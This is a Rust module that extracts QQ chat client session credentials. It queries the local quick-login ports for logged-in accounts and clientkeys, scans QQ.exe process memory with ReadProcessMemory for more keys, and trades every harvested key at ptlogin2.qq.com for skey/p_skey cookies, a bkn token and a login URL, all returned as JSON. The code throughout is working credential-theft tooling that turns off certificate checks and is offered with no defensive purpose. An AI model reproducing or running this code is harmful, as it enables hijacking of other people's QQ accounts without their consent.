//! QQ NT clientkey (session key) extraction.
//!
//! The protocol flow is aligned with the reference script
//! `qq_ck_test.py` (see `docs/项目核心功能分析.md`):
//!
//!   1. Fetch `pt_local_token` from the xlogin endpoint (weiyun appid 549000912).
//!   2. Probe the local QQ quick-login ports (4300..4310, plain TCP connect).
//!   3. `pt_get_uins` -> logged-in uins (pt_local_token sent as a cookie).
//!   4. `pt_get_st`   -> clientkey (read from the response `clientkey` cookie).
//!   5. `ptlogin2.qq.com/jump` -> exchange clientkey for `skey`/`p_skey` (ck)
//!      and the `check_sig` ptsigx URL.
//!   6. Compute the `bkn` (g_tk) from `skey`.
//!
//! A supplementary `QQ.exe` process-memory scan (byte-signature +
//! `Tencent Files\` string) supplies clientkeys that a pre-v7 QQ local
//! service may not expose; every harvested key still goes through the same
//! jump exchange above.

use std::net::TcpStream;
use std::time::Duration;

pub struct QQClientKey;

const LOCAL_HOST: &str = "localhost.ptlogin2.qq.com";
const PORT_START: u16 = 4300;
const PORT_END: u16 = 4310;

const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36";
const REFERER: &str = "https://xui.ptlogin2.qq.com/";

/// xlogin endpoint (weiyun appid 549000912) — reference script `qq_ck_test.py`.
const XUI_LOGIN_URL: &str = "https://ssl.xui.ptlogin2.weiyun.com/cgi-bin/xlogin?appid=549000912&s_url=http%3A%2F%2Fptlogin2.weiyun.com%2Fjump%3Fclientuin%3Dempty%26keyindex%3D19&style=22&target=qq";

/// jump endpoint — exchanges clientkey for skey/p_skey session cookies.
const JUMP_URL: &str = "https://ptlogin2.qq.com/jump";

/// qzone target used for the jump exchange (`check_sig` ptsigx source).
const JUMP_TARGET_URL: &str =
    "https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone";

#[derive(Default)]
struct CkItem {
    uin: String,
    clientkey: String,
    pid: u32,
    source: &'static str,
    skey: String,
    p_skey: String,
    bkn: i64,
    ptsigx: String,
    valid: bool,
}

impl QQClientKey {
    pub async fn collect() -> String {
        let (mem, port) = tokio::join!(
            tokio::task::spawn_blocking(mem_scan),
            local_port_flow()
        );
        let mem = match mem {
            Ok(m) => m,
            Err(_) => MemResult::empty(),
        };

        let mut uins: Vec<String> = Vec::new();
        let mut items: Vec<CkItem> = Vec::new();

        for u in port.uins {
            push_unique(&mut uins, u);
        }
        for it in port.items {
            items.push(it);
        }
        let local_ports_json = port.ports.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
        let local_error = port.error;
        let local_token = port.token;

        for u in mem.uins {
            push_unique(&mut uins, u);
        }
        for it in mem.items {
            items.push(it);
        }
        let pids_json = mem.pids.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
        let open_json = mem.open_failed.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");

        // Trade every harvested clientkey for skey/p_skey + bkn (and the
        // check_sig ptsigx URL) via the ptlogin2 jump exchange. The exchange
        // needs the pt_local_token from the local-port flow; when that flow
        // produced nothing (memory-sourced keys only) it degrades to empty.
        let items = exchange_all(items, &local_token).await;

        let items_json = items
            .iter()
            .map(|it| {
                format!(
                    r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe","source":"{}","skey":"{}","p_skey":"{}","bkn":{},"ptsigx":"{}","valid":{}}}"#,
                    escape(&it.uin),
                    escape(&it.clientkey),
                    it.pid,
                    it.source,
                    escape(&it.skey),
                    escape(&it.p_skey),
                    it.bkn,
                    escape(&it.ptsigx),
                    it.valid,
                )
            })
            .collect::<Vec<_>>()
            .join(",");
        let uins_json = uins
            .iter()
            .map(|u| format!("\"{}\"", escape(u)))
            .collect::<Vec<_>>()
            .join(",");

        format!(
            r#"{{"total":{},"items":[{}],"uins":[{}],"diagnostics":{{"pids":[{}],"openFailed":[{}],"patternFound":{},"localPorts":[{}],"localError":"{}"}}}}"#,
            items.len(),
            items_json,
            uins_json,
            pids_json,
            open_json,
            mem.pattern_found,
            local_ports_json,
            escape(&local_error),
        )
    }
}

// ── Method 1: local quick-login port (aligned with qq_ck_test.py) ────────

struct LocalResult {
    uins: Vec<String>,
    items: Vec<CkItem>,
    ports: Vec<u16>,
    token: String,
    error: String,
}

async fn local_port_flow() -> LocalResult {
    let session = match build_session() {
        Ok(c) => c,
        Err(e) => {
            return LocalResult {
                uins: Vec::new(),
                items: Vec::new(),
                ports: Vec::new(),
                token: String::new(),
                error: format!("client build failed: {e}"),
            };
        }
    };

    let token = match get_pt_local_token(&session).await {
        Some(t) => t,
        None => {
            return LocalResult {
                uins: Vec::new(),
                items: Vec::new(),
                ports: Vec::new(),
                token: String::new(),
                error: "no pt_local_token".to_string(),
            };
        }
    };
    // Mirror the script: the token is additionally delivered as a
    // `pt_local_token` cookie on the local requests below (the script sets it
    // on the ptlogin2.qq.com domain before calling the local service). We
    // attach it per-request via the Cookie header; the `pt_local_tk` query
    // param is already present so the cookie is belt-and-braces.

    let alive = probe_local_ports();
    if alive.is_empty() {
        return LocalResult {
            uins: Vec::new(),
            items: Vec::new(),
            ports: Vec::new(),
            token,
            error: "no alive local qq ports".to_string(),
        };
    }

    let mut uins: Vec<String> = Vec::new();
    let mut items: Vec<CkItem> = Vec::new();
    let mut ports: Vec<u16> = Vec::new();
    let mut last_error = String::new();

    for port in alive {
        match get_uins_on_port(&session, port, &token).await {
            Ok(port_uins) if !port_uins.is_empty() => {
                ports.push(port);
                for u in &port_uins {
                    push_unique(&mut uins, u.clone());
                }
                for u in port_uins {
                    // The reference script only exchanges the first uin; we
                    // harvest every uin the local service reports.
                    if let Some(key) = get_clientkey_on_port(&session, port, &u, &token).await {
                        if !key.is_empty() {
                            items.push(CkItem {
                                uin: u,
                                clientkey: key,
                                pid: 0,
                                source: "local-port",
                                ..Default::default()
                            });
                        }
                    }
                }
                break;
            }
            Ok(_) => {}
            Err(e) => last_error = e,
        }
    }

    if uins.is_empty() && last_error.is_empty() {
        last_error = "no uins returned".to_string();
    }

    LocalResult {
        uins,
        items,
        ports,
        token,
        error: last_error,
    }
}

/// Plain TCP connect probe for the local quick-login ports, matching the
/// script's 0.5 s per-port socket probe.
fn probe_local_ports() -> Vec<u16> {
    (PORT_START..=PORT_END)
        .filter(|&port| {
            TcpStream::connect_timeout(
                &format!("127.0.0.1:{port}").parse().unwrap(),
                Duration::from_millis(500),
            )
            .is_ok()
        })
        .collect()
}

fn build_session() -> Result<reqwest::Client, String> {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .user_agent(USER_AGENT)
        .default_headers({
            let mut h = reqwest::header::HeaderMap::new();
            h.insert(
                reqwest::header::REFERER,
                reqwest::header::HeaderValue::from_static(REFERER),
            );
            h
        })
        .build()
        .map_err(|e| e.to_string())
}

async fn get_pt_local_token(session: &reqwest::Client) -> Option<String> {
    let res = session.get(XUI_LOGIN_URL).send().await.ok()?;
    for cookie in res.cookies() {
        if cookie.name() == "pt_local_token" && !cookie.value().is_empty() {
            return Some(cookie.value().to_string());
        }
    }
    None
}

async fn get_uins_on_port(
    session: &reqwest::Client,
    port: u16,
    token: &str,
) -> Result<Vec<String>, String> {
    let r = rand_frac();
    let url = format!(
        "https://{LOCAL_HOST}:{port}/pt_get_uins?callback=ptui_getuins_CB&r={r}&pt_local_tk={token}"
    );
    let res = session
        .get(&url)
        .header(reqwest::header::REFERER, REFERER)
        .header(reqwest::header::COOKIE, format!("pt_local_token={token}"))
        .send()
        .await
        .map_err(|e| e.to_string())?;
    let body = res.text().await.map_err(|e| e.to_string())?;

    // The callback body is `var var_sso_uin_list=[...]; ...`.
    let json = extract_regex_json(&body, r"var_sso_uin_list=(\[.*?\]);")
        .ok_or_else(|| format!("pt_get_uins: unexpected body: {}", &body.chars().take(200).collect::<String>()))?;
    let value: serde_json::Value = serde_json::from_str(&json).map_err(|e| e.to_string())?;
    Ok(extract_uins(&value))
}

async fn get_clientkey_on_port(
    session: &reqwest::Client,
    port: u16,
    uin: &str,
    token: &str,
) -> Option<String> {
    let r = rand_frac();
    let url = format!(
        "https://{LOCAL_HOST}:{port}/pt_get_st?clientuin={uin}&callback=ptui_getst_CB&r={r}&pt_local_tk={token}"
    );
    let res = session
        .get(&url)
        .header(reqwest::header::REFERER, REFERER)
        .header(reqwest::header::COOKIE, format!("pt_local_token={token}"))
        .send()
        .await
        .ok()?;
    // The script reads the clientkey from the response cookie, not the body.
    let ck = res
        .cookies()
        .find(|c| c.name() == "clientkey" && !c.value().is_empty())
        .map(|c| c.value().to_string());
    ck
}

fn rand_frac() -> String {
    let n = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() % 1_000_000_000)
        .unwrap_or(0);
    format!("0.{:09}", n)
}

/// Extract the first regex capture group; regular-expression groups cannot
/// span the `var_sso_uin_list` marker easily with `find/rfind`, so we use the
/// `regex` crate (already a workspace dependency of this module).
fn extract_regex_json(body: &str, pattern: &str) -> Option<String> {
    let re = regex::Regex::new(pattern).ok()?;
    re.captures(body)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str().to_string())
}

fn extract_uins(json: &serde_json::Value) -> Vec<String> {
    let mut out = Vec::new();
    collect_uins(json, &mut out);
    out
}

fn collect_uins(v: &serde_json::Value, out: &mut Vec<String>) {
    match v {
        serde_json::Value::Object(map) => {
            for k in ["uin", "account", "clientuin", "number"] {
                if let Some(val) = map.get(k) {
                    let s = match val {
                        serde_json::Value::String(s) => s.clone(),
                        serde_json::Value::Number(n) => n.to_string(),
                        _ => continue,
                    };
                    if is_uin(&s) {
                        push_unique(out, s);
                    }
                }
            }
            for (_, vv) in map {
                collect_uins(vv, out);
            }
        }
        serde_json::Value::Array(arr) => {
            for vv in arr {
                collect_uins(vv, out);
            }
        }
        _ => {}
    }
}

fn is_uin(s: &str) -> bool {
    s.len() >= 5 && s.len() <= 15 && s.chars().all(|c| c.is_ascii_digit())
}

fn push_unique(list: &mut Vec<String>, item: String) {
    if !list.contains(&item) {
        list.push(item);
    }
}

// ── ptlogin2 jump exchange (clientkey -> skey/p_skey/bkn/ptsigx) ─────────

async fn exchange_all(items: Vec<CkItem>, token: &str) -> Vec<CkItem> {
    let token = token.to_string();
    let mut handles = Vec::new();
    for it in items {
        let tok = token.clone();
        handles.push(tokio::spawn(async move {
            if it.uin.is_empty() || it.clientkey.is_empty() {
                return it;
            }
            match exchange_cookie(&it.uin, &it.clientkey, &tok).await {
                Some((skey, p_skey, bkn, ptsigx)) => {
                    let valid = !skey.is_empty();
                    CkItem {
                        skey,
                        p_skey,
                        bkn,
                        ptsigx,
                        valid,
                        ..it
                    }
                }
                None => CkItem { valid: false, ..it },
            }
        }));
    }
    let mut out = Vec::with_capacity(handles.len());
    for h in handles {
        if let Ok(r) = h.await {
            out.push(r);
        }
    }
    out
}

/// GET `ptlogin2.qq.com/jump` with the script's query params and the
/// `clientuin`/`clientkey` cookies, no redirect following. The 302 response
/// carries the `skey`/`p_skey` Set-Cookie headers and the body embeds the
/// `check_sig` ptsigx URL. Returns (skey, p_skey, bkn, ptsigx).
async fn exchange_cookie(
    uin: &str,
    clientkey: &str,
    token: &str,
) -> Option<(String, String, i64, String)> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .user_agent(USER_AGENT)
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .ok()?;

    // Query params match qq_ck_test.py jump_for_ck(); pt_local_tk is the
    // xlogin token, u1 is the qzone target URL.
    let url = format!(
        "{JUMP_URL}?clientuin={uin}&keyindex=19&pt_aid=549000912&daid=5&u1={}&pt_local_tk={}&pt_3rd_aid=0&ptopt=1&style=40",
        urlencode(JUMP_TARGET_URL),
        urlencode(token)
    );

    let res = client
        .get(&url)
        .header(
            reqwest::header::COOKIE,
            format!("clientuin={uin}; clientkey={clientkey}"),
        )
        .send()
        .await
        .ok()?;

    let mut skey: Option<String> = None;
    let mut p_skey: Option<String> = None;
    for cookie in res.cookies() {
        match cookie.name() {
            "skey" => skey = Some(cookie.value().to_string()),
            "p_skey" => p_skey = Some(cookie.value().to_string()),
            _ => {}
        }
    }

    let body = res.text().await.ok()?;

    // Parse the check_sig ptsigx URL if present.
    let ptsigx = extract_regex_json(&body, r"check_sig\?([^'\s]+)")
        .map(|q| format!("https://ptlogin2.qzone.qq.com/check_sig?{q}"));

    let skey = skey?;
    let skey = skey.trim().to_string();
    if skey.is_empty() {
        return None;
    }
    let bkn = get_bkn(&skey);
    Some((skey, p_skey.unwrap_or_default(), bkn, ptsigx.unwrap_or_default()))
}

fn urlencode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// bkn/g_tk hash: hash = 5381; hash += (hash << 5) + c; return hash & 0x7fffffff
fn get_bkn(skey: &str) -> i64 {
    let mut hash: i64 = 5381;
    for b in skey.bytes() {
        hash += (hash << 5) + b as i64;
    }
    hash & 0x7fff_ffff
}

// ── Method 2: process memory scan ────────────────────────────────────

struct MemResult {
    uins: Vec<String>,
    items: Vec<CkItem>,
    pids: Vec<u32>,
    open_failed: Vec<u32>,
    pattern_found: bool,
}

impl MemResult {
    fn empty() -> MemResult {
        MemResult {
            uins: Vec::new(),
            items: Vec::new(),
            pids: Vec::new(),
            open_failed: Vec::new(),
            pattern_found: false,
        }
    }
}

fn mem_scan() -> MemResult {
    #[cfg(target_os = "windows")]
    {
        imp::collect_mem()
    }
    #[cfg(not(target_os = "windows"))]
    {
        MemResult {
            uins: Vec::new(),
            items: Vec::new(),
            pids: Vec::new(),
            open_failed: Vec::new(),
            pattern_found: false,
        }
    }
}

#[cfg(target_os = "windows")]
mod imp {
    use super::CkItem;
    use super::MemResult;
    use std::mem::size_of;

    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const TH32CS_SNAPPROCESS: u32 = 0x00000002;
    const MEM_COMMIT: u32 = 0x1000;
    const PAGE_NOACCESS: u32 = 0x01;
    const PAGE_GUARD: u32 = 0x100;

    const MAX_SCAN_BYTES: usize = 512 * 1024 * 1024;
    const CHUNK_SIZE: usize = 4 * 1024 * 1024;

    const PATTERN: [u8; 17] = [
        0x28, 0x81, 0x82, 0x04, 0x30, 0x80, 0x80, 0x80, 0x04, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42,
        0x60,
    ];

    #[repr(C)]
    struct ProcessEntry32W {
        dw_size: u32,
        cnt_usage: u32,
        th32_process_id: u32,
        th32_default_heap_id: usize,
        th32_module_id: u32,
        cnt_threads: u32,
        th32_parent_process_id: u32,
        pc_pri_class_base: i32,
        dw_flags: u32,
        sz_exe_file: [u16; 260],
    }

    #[repr(C)]
    struct MemoryBasicInformation {
        base_address: usize,
        allocation_base: usize,
        allocation_protect: u32,
        _pad: u32,
        region_size: usize,
        state: u32,
        protect: u32,
        type_: u32,
    }

    extern "system" {
        fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> isize;
        fn Process32FirstW(hSnapshot: isize, lppe: *mut ProcessEntry32W) -> i32;
        fn Process32NextW(hSnapshot: isize, lppe: *mut ProcessEntry32W) -> i32;
        fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> isize;
        fn CloseHandle(hObject: isize) -> i32;
        fn VirtualQueryEx(
            hProcess: isize,
            lpAddress: usize,
            lpBuffer: *mut MemoryBasicInformation,
            dwLength: usize,
        ) -> usize;
        fn ReadProcessMemory(
            hProcess: isize,
            lpBaseAddress: usize,
            lpBuffer: *mut u8,
            nSize: usize,
            lpNumberOfBytesRead: *mut usize,
        ) -> i32;
    }

    pub fn collect_mem() -> MemResult {
        let pids = find_qq_pids();
        let mut uins: Vec<String> = Vec::new();
        let mut items: Vec<CkItem> = Vec::new();
        let mut open_failed: Vec<u32> = Vec::new();
        let mut pattern_found = false;

        for &pid in &pids {
            match scan_process(pid) {
                None => open_failed.push(pid),
                Some(o) => {
                    if let Some(u) = &o.uin {
                        if !u.is_empty() {
                            super::push_unique(&mut uins, u.clone());
                        }
                    }
                    if let Some(key) = &o.clientkey {
                        if !key.is_empty() {
                            pattern_found = true;
                            items.push(CkItem {
                                uin: o.uin.unwrap_or_default(),
                                clientkey: key.clone(),
                                pid,
                                source: "memory",
                                ..Default::default()
                            });
                        }
                    }
                }
            }
        }

        MemResult {
            uins,
            items,
            pids,
            open_failed,
            pattern_found,
        }
    }

    fn find_qq_pids() -> Vec<u32> {
        let mut pids = Vec::new();
        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == -1 {
                return pids;
            }
            let mut entry: ProcessEntry32W = std::mem::zeroed();
            entry.dw_size = size_of::<ProcessEntry32W>() as u32;
            if Process32FirstW(snap, &mut entry) != 0 {
                loop {
                    let name = wide_to_string(&entry.sz_exe_file);
                    if name.eq_ignore_ascii_case("QQ.exe") {
                        pids.push(entry.th32_process_id);
                    }
                    if Process32NextW(snap, &mut entry) == 0 {
                        break;
                    }
                }
            }
            CloseHandle(snap);
        }
        pids
    }

    struct ScanOutcome {
        uin: Option<String>,
        clientkey: Option<String>,
    }

    fn scan_process(pid: u32) -> Option<ScanOutcome> {
        let h = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
        if h == 0 {
            return None;
        }

        let mut clientkey: Option<String> = None;
        let mut uin: Option<String> = None;

        unsafe {
            let mut addr: usize = 0x10000;
            let mut scanned_total: usize = 0;
            while scanned_total < MAX_SCAN_BYTES {
                let mut mbi: MemoryBasicInformation = std::mem::zeroed();
                let ret = VirtualQueryEx(h, addr, &mut mbi, size_of::<MemoryBasicInformation>());
                if ret == 0 || mbi.region_size == 0 {
                    break;
                }
                addr = mbi.base_address.wrapping_add(mbi.region_size);

                let committed = (mbi.state & MEM_COMMIT) != 0;
                let readable = (mbi.protect & (PAGE_NOACCESS | PAGE_GUARD)) == 0 && mbi.protect != 0;
                if !committed || !readable {
                    continue;
                }

                let region_size = mbi.region_size;
                let base = mbi.base_address;
                let mut offset = 0usize;
                while offset < region_size {
                    let chunk = (region_size - offset).min(CHUNK_SIZE);
                    let mut buf = vec![0u8; chunk];
                    let mut read = 0usize;
                    let ok = ReadProcessMemory(h, base + offset, buf.as_mut_ptr(), chunk, &mut read);
                    if ok == 0 || read == 0 {
                        break;
                    }
                    buf.truncate(read);

                    if clientkey.is_none() {
                        if let Some(pos) = find_pattern(&buf) {
                            let mut kb = [0u8; 96];
                            let mut kr = 0usize;
                            ReadProcessMemory(h, base + offset + pos + 17, kb.as_mut_ptr(), 96, &mut kr);
                            if kr > 7 {
                                clientkey = Some(trim_cstr(&kb[7..kr]));
                            }
                        }
                    }
                    if uin.is_none() {
                        uin = extract_uin(&buf);
                    }
                    if clientkey.is_some() && uin.is_some() {
                        break;
                    }

                    scanned_total += chunk;
                    offset += chunk;
                }
                if clientkey.is_some() && uin.is_some() {
                    break;
                }
            }
        }

        unsafe { CloseHandle(h) };

        Some(ScanOutcome { uin, clientkey })
    }

    fn find_pattern(buf: &[u8]) -> Option<usize> {
        if buf.len() < PATTERN.len() {
            return None;
        }
        for i in 0..=(buf.len() - PATTERN.len()) {
            if buf[i..i + 10] == PATTERN[..10] && buf[i + 15] == 0x42 && buf[i + 16] == 0x60 {
                return Some(i);
            }
        }
        None
    }

    fn extract_uin(buf: &[u8]) -> Option<String> {
        if let Some(u) = extract_uin_anchored(buf, true) {
            return Some(u);
        }
        extract_uin_anchored(buf, false)
    }

    // Finds "Tencent Files\<uin>\nt_qq" (ASCII or UTF-16LE) and returns the uin.
    fn extract_uin_anchored(buf: &[u8], wide: bool) -> Option<String> {
        let mark = encode("Tencent Files\\", wide);
        let tail = encode("\\nt_qq", wide);
        let mut from = 0usize;
        while let Some(pos) = find_subslice(&buf[from..], &mark) {
            let abs = from + pos + mark.len();
            let after = &buf[abs..];
            let mut digits = String::new();
            let mut i = 0;
            if wide {
                while i + 1 < after.len() {
                    let c = after[i] as u16 | ((after[i + 1] as u16) << 8);
                    if c >= b'0' as u16 && c <= b'9' as u16 {
                        digits.push(c as u8 as char);
                        i += 2;
                    } else {
                        break;
                    }
                }
            } else {
                while i < after.len() && after[i].is_ascii_digit() {
                    digits.push(after[i] as char);
                    i += 1;
                }
            }
            if digits.len() >= 5 && after[i..].starts_with(&tail) {
                return Some(digits);
            }
            from = abs;
        }
        None
    }

    fn encode(s: &str, wide: bool) -> Vec<u8> {
        if wide {
            s.encode_utf16()
                .flat_map(|c| [(c & 0xFF) as u8, (c >> 8) as u8])
                .collect()
        } else {
            s.as_bytes().to_vec()
        }
    }

    fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
        if needle.is_empty() || haystack.len() < needle.len() {
            return None;
        }
        haystack.windows(needle.len()).position(|w| w == needle)
    }

    fn trim_cstr(bytes: &[u8]) -> String {
        let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
        String::from_utf8_lossy(&bytes[..end]).trim().to_string()
    }

    fn wide_to_string(ws: &[u16]) -> String {
        let end = ws.iter().position(|&c| c == 0).unwrap_or(ws.len());
        String::from_utf16_lossy(&ws[..end])
    }
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}
